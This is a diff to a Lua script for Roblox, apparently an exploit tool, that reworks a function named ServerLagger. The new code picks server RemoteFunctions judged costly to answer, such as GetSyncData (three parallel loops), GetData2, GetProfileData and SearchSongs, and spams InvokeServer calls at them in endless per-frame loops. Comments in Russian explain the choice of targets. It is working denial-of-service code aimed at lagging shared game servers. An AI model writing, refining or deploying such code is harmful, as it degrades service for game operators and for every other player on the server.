@@ -7186,25 +7186,33 @@ local function ServerLagger()
             CONFIG.Colors.Text
         )
     end
-    local targets = {
-        "GetData2", "GetProfileData", "SearchSongs",
-        "GetLeaderboard", "GetLeaderboardData", "GetTimer",
-        "GetRanks", "GetVersion", "GetQueue", "GetItemData",
-        "GetSyncData", "GetPlayerData", "GetLastRoundRewards",
-        "GetTradeStatus", "CheckInventory",
+    local syncRF   = ReplicatedStorage:FindFirstChild("GetSyncData")
+    local heavyRFs = {
+        ReplicatedStorage:FindFirstChild("GetData2",      true),
+        ReplicatedStorage:FindFirstChild("GetProfileData", true),
+        ReplicatedStorage:FindFirstChild("SearchSongs",    true),
     }
-    for _, name in ipairs(targets) do
-        local rf = ReplicatedStorage:FindFirstChild(name, true)
-        if rf then
-            task.spawn(function()
-                while true do
-                    task.spawn(function()
-                        pcall(function() rf:InvokeServer() end)
-                    end)
-                    task.wait()
-                end
-            end)
-        end
+
+    local function spawnLoop(rf)
+        if not rf then return end
+        task.spawn(function()
+            while true do
+                task.spawn(function()
+                    pcall(function() rf:InvokeServer() end)
+                end)
+                task.wait()
+            end
+        end)
+    end
+
+    -- GetSyncData: 3 параллельных spawner'а (тяжёлый handler)
+    spawnLoop(syncRF)
+    spawnLoop(syncRF)
+    spawnLoop(syncRF)
+
+    -- Тяжёлые по байтам: по одному spawner'у
+    for _, rf in ipairs(heavyRFs) do
+        spawnLoop(rf)
     end
 end
 
